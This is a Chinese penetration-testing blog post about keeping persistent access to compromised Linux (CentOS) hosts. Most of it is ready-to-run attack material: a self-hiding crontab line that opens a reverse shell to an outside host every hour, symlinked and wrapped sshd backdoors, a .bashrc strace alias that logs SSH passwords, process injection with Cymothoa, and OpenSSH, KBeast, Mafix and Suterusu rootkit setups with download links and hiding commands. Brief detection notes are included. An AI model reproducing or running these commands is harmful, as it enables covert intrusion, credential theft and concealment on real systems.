# Linux Backdoor

0x00 前言
=======

* * *

前一段时间学习一小部分内网的小笔记，[http://zone.wooyun.org/content/26415](http://zone.wooyun.org/content/26415)

结果没想到好像还是比较受欢迎，也是第一次被劈雷。最近办比赛遇上了rookit种植，感觉很无奈，所以自己也就研究了一下，内容都是一些以前的技术，也是为下面的笔记再次增加一章(windows下的域权限维持可以多看看三好学生师傅的文章)。大牛飘过。

笔记地址：  
[https://github.com/l3m0n/pentest_study](https://github.com/l3m0n/pentest_study)

测试环境:centos 6.5

0x01 crontab
============

* * *

计划任务,永远的爱

每60分钟反弹一次shell给dns.wuyun.org的53端口

```
(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/dns.wuyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -

```

0x02 硬链接sshd
============

* * *

上了防火墙的坑...测试前关闭一下吧

```
service iptables stop

```

出现：ssh: connect to host 192.168.206.142 port 2333: No route to host

```
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;
ssh root@192.168.206.142 -p 2333

```

用root/bin/ftp/mail当用户名,密码任意

后门排查：

```
netstat -anopt

```

查找有问题的进程

```
ps -ef | grep pid
ls -al /tmp/su
kill -9 pid
rm -rf /tmp/su

```

![p1](http://drops.javaweb.org/uploads/images/a53b7270d8b79b0d5cee34a7d203d1c95506a0c6.jpg)

0x03 SSH Server wrapper
=======================

* * *

条件：开启ssh，如果不连接是没有端口进程的，而且last也看不到

```
cd /usr/sbin
mv sshd ../bin
echo '#!/usr/bin/perl' >sshd

echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd

echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
//不用重启也行
/etc/init.d/sshd restart

```

kali下的执行

```
socat STDIO TCP4:192.168.206.142:22,sourceport=13377

```

对于源端口的修改：

```
>>> import struct
>>> buffer = struct.pack('>I6',19526)
>>> print repr(buffer)
'\x00\x00LF'
>>> buffer = struct.pack('>I6',13377)
>>> print buffer
4A

```

后门排查：

```
netstat -anopt
//查看一下sshd进程情况,如果发现不是/usr/sbin/目录下面,就有问题
ll /proc/1786
cat /usr/sbin/sshd

```

![p2](http://drops.javaweb.org/uploads/images/86f128b0364e1fae54517eb6e6ca0a348985417d.jpg)

还原：

```
rm -rf /usr/sbin/sshd; mv /usr/bin/sshd ../sbin;

```

0x04 SSH keylogger
==================

* * *

vim当前用户下的.bashrc文件,末尾添加

```
alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh'

```

然后使配置生效

```
source .bashrc

```

当本地su或者ssh的时候,就会在tmp下面记录(无论失败成功都有记录)

![p3](http://drops.javaweb.org/uploads/images/72a7f32abc61945fdb919f71bd092f9ad774e8ea.jpg)

0x05 Cymothoa_进程注入backdoor
==========================

* * *

很赞的点是注入到的进程,只要有权限就行,然后反弹的也就是进程相应的权限(并不需要root那样),当然进程重启或者挂了也就没了.当然动作也是很明显的。

线程注入：

```
./cymothoa -p 2270 -s 1 -y 7777

```

![p4](http://drops.javaweb.org/uploads/images/d40b6bb83559c8c646c0f955ef88188a7a509a05.jpg)

```
nc -vv ip 7777

```

0x06openssh_rookit
==================

* * *

下载地址：[http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz](http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz)

先patch

```
wget http://mirror.corbina.net/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
tar zxvf openssh-5.9p1.tar.gz
cp sshbd5.5p1.diff openssh-5.9p1/
cd openssh-5.9p1
patch < sshbd5.9p1.diff

```

安装依赖

```
yum install zlib-devel
yum install openssl-devel
yun install pam-devel
yun install krb5-lib(没安装)

```

修改includes.h

![p5](http://drops.javaweb.org/uploads/images/3fb1798fc7ed4cf764c215042dda724a32080a21.jpg)

编译安装再重启sshd服务

```
./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
make && make install && service  sshd restart

```

利用：

会记录登入登出的ssh账号密码(错误的也会记录),配置文件中设置的密码,也可以通过ssh然后root登陆。

![p6](http://drops.javaweb.org/uploads/images/54b4ad0151f4b1b95f6dd6b5ae053aa105426679.jpg)

发现：

![p7](http://drops.javaweb.org/uploads/images/a3515c60092eb379da3f0b7b2a35b6590fb68d57.jpg)

找到可疑sshd并且查看一下last的登陆ip，最后kill他们的进程,清除暂时不知

0x07 Kbeast_rootkit
===================

* * *

[http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz](http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz)

```
tar -zxvf ipsecs-kbeast-v1.tar.gz
cd kbeast-v1/
vi config.h

```

重要配置：

```
//键盘记录
#define _LOGFILE_ "acctlog"

//rookit产生的日志配置文件所存储位置(此位置是被隐藏的)
#define _H4X_PATH_ "/usr/_h4x_"

//telnet端口(端口也是隐藏的,netstat是看不到的)
#define _HIDE_PORT_ 23333

//telnet的端口以及返回回来的用户名(必须能调用/sh/bash,否则安装会出现Network Daemon错误)
#define _RPASSWORD_ "lolloltest"
#define _MAGIC_NAME_ "root"

```

利用：

1、记录：

![p8](http://drops.javaweb.org/uploads/images/1b8d14d0efe6fa2fb86b41892924cb172c7818ab.jpg)

2、telnet连接

![p9](http://drops.javaweb.org/uploads/images/fbff76876774fad4aa12afabce2eb5688dafa793.jpg)

*   缺点：重启就会失效,需要放入启动项
*   优点：相比上面都是需要ssh相关或者是有一个低权限维持才能发挥的一个后门,这个是直接开放一个独立的端口

发现：其实感觉修改一下进程名,发现还是有点麻烦

![p10](http://drops.javaweb.org/uploads/images/b0df89ef98caf22603e72c30e4bd0f6fe6f19dc3.jpg)

0x08 Mafix + Suterusu rookit
============================

* * *

1、Mafix

```
./root lolloltest 23333

```

这样就会产生一个端口为23333,root密码也可以用lolloltest登陆的ssh,端口不隐藏

![p11](http://drops.javaweb.org/uploads/images/4b9ee5fbe9588cbf481f43fb0bc991e18f5dbdc0.jpg)

这时候就可以用Suterusu配合使用

2、Suterusu

功能表：

```
Get root
$ ./sock 0
Hide PID
$ ./sock 1 [pid]
Unhide PID
$ ./sock 2 [pid]
Hide TCPv4 port
$ ./sock 3 [port]
Unhide TCPv4 port
$ ./sock 4 [port]
Hide TCPv6 port
$ ./sock 5 [port]
Unhide TCPv6 port
$ ./sock 6 [port]
Hide UDPv4 port
$ ./sock 7 [port]
Unhide UDPv4 port
$ ./sock 8 [port]
Hide UDPv6 port
$ ./sock 9 [port]
Unhide UDPv6 port
$ ./sock 10 [port]
Hide file/directory
$ ./sock 11 [name]
Unhide file/directory
$ ./sock 12 [name]

```

编译：

```
make linux-x86 KDIR=/lib/modules/$(uname -r)/build
gcc sock.c -o sock
//加载模块
insmod suterusu.ko

```

结合Mafix使用(隐藏端口):

```
./sock 3 [port]

```

![p12](http://drops.javaweb.org/uploads/images/6482d49639a88423f93f4aebc663b972ea4ae408.jpg)

0x09 参考资料
=========

* * *

*   [https://www.aldeid.com/wiki/Cymothoa](https://www.aldeid.com/wiki/Cymothoa)
*   [http://phrack.org/issues/68/9.html](http://phrack.org/issues/68/9.html)
*   [http://www.joychou.org/index.php/web/ssh-backdoor.html](http://www.joychou.org/index.php/web/ssh-backdoor.html)